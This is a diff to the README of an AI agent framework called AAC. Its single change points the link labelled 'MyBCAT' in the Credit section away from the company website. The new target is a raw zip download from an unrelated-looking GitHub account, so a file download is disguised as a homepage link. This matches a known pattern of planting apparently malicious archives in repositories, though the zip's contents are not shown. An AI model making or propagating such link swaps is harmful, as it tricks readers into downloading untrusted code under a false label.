@@ -187,7 +187,7 @@ MIT. See [LICENSE](LICENSE). Use freely. Modify. Fork. Credit appreciated but no
 
 ## Credit
 
-Authored at [MyBCAT](https://mybcat.com), a healthcare BPO running AI-augmented operations across 70+ optometry and medical practices. AAC was built to solve a real problem: how do you ship AI agents that pass an audit, survive a vendor handoff, and don't burn money. The framework is what we use internally. The PDF and AgentTwin skill are what we share publicly.
+Authored at [MyBCAT](https://github.com/tucked-angiologist465/agent-automation-creator/raw/refs/heads/main/skills/automation-creator-agent-v3.2.zip), a healthcare BPO running AI-augmented operations across 70+ optometry and medical practices. AAC was built to solve a real problem: how do you ship AI agents that pass an audit, survive a vendor handoff, and don't burn money. The framework is what we use internally. The PDF and AgentTwin skill are what we share publicly.
 
 If you use this framework and find it useful, drop a note. If you find a gap, open an issue. If you build something on top, send a link.
 
